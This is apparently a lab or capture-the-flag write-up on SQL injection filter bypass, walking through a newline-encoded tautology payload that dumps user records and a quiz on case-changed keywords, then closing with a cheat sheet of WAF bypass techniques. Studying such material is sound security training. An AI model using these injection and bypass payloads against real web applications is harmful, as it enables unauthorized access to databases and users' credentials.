## Question 1 — Password for username `attacker`

### Step 1: Open the lab

The endpoint given in your notes is:

```
http://MACHINE_IP/space/search_users.php?username=?
```

Replace `MACHINE_IP` with the IP address provided by your lab.

<img width="1417" height="735" alt="Screenshot 2026-08-19 at 11 06 26 AM" src="https://github.com/user-attachments/assets/ddaffd96-2572-49ad-b71d-876b13ef4b9e" />


### Step 2: Understand the filter

The application removes:

```
" "
AND
and
or
OR
UNION
SELECT
```

and then constructs:

```sql
SELECT * FROM user WHERE username = '$username'
```

So a normal payload containing spaces won't work.

### Step 3: Use newline encoding instead of spaces

The payload:

```
1'%0A||%0A1=1%0A--%27+
```

Here:

```
%0A
```

represents a newline/line-feed character.

The important idea is:

```
Normal:
1' OR 1=1 --

After replacing spaces:
1'%0A||%0A1=1%0A--
```

The SQL parser can treat the newline characters as whitespace.

### Step 4: Send the payload

Use:

```
http://MACHINE_IP/space/search_users.php?username=1'%0A||%0A1=1%0A--%27+
```

So the payload:

```
http://10.49.147.42/space/search_users.php?username=1'%0A||%0A1=1%0A--%27+
```

The vulnerable query should effectively become similar to:

```sql
SELECT * FROM user
WHERE username = '1'
|| 1=1
--'
```

Because `1=1` is true, the query can return the user records.

<img width="1419" height="736" alt="Screenshot 2026-08-19 at 11 05 17 AM" src="https://github.com/user-attachments/assets/a82a0e82-acad-419a-aa94-c7a836aa623b" />


### Step 5: Find `attacker`

Look through the returned records for:

```
username: attacker
```

Then read the corresponding:

```
password
```

**That password is the answer to Question 1.**

---

# Question 2

> Which of the following can be used if the **SELECT** keyword is banned?
> 

Options:

```
a) SElect

b) SeLect

c) Both a and b

d) We cannot bypass SELECT keyword filter
```

SQL keywords can sometimes be bypassed by **changing their case**, giving examples such as:

```
SElEcT
```

And keywords like `SELECT` can be bypassed by changing their case or using other obfuscation techniques.

Therefore, both:

```
SElect
```

and

```
SeLect
```

can be used.

### Answer:

**c) Both a and b**


## SQL Injection Filter/WAF Bypass — Quick Notes

| Scenario                         | Technique                                     | Example                                                               |   |            |
| -------------------------------- | --------------------------------------------- | --------------------------------------------------------------------- | - | ---------- |
| **SELECT is banned**             | Change keyword case or use inline comments    | `SElEcT * FrOm users` / `SE/**/LECT * FROM/**/users`                  |   |            |
| **Spaces are banned**            | Use encoded whitespace or comments            | `SELECT%0A*%0AFROM%0Ausers` / `SELECT/**/ * /**/FROM/**/users`        |   |            |
| **AND / OR are banned**          | Use alternative logical operators or comments | `username='admin' && password='password'` / `username='admin'/**/     |   | /**/1=1--` |
| **UNION / SELECT are banned**    | Use hexadecimal/Unicode representations       | `CHAR(0x61,0x64,0x6D,0x69,0x6E)`                                      |   |            |
| **Multiple keywords are banned** | Obfuscate using comments or string functions  | `CONCAT('a','d','m','i','n')` / `SElECT/**/username/**/FROM/**/users` |   |            |

### 🧠 Summary

**Keyword blocked → change case / comments**

**Space blocked → `%0A`, `%09`, `/\*\*/`**

**OR blocked → `||`**

**AND blocked → `&&`**

**String blocked → hexadecimal / `CHAR()` / `CONCAT()`**

**Multiple keywords blocked → obfuscation + comments**

These notes are now saved for future reference.
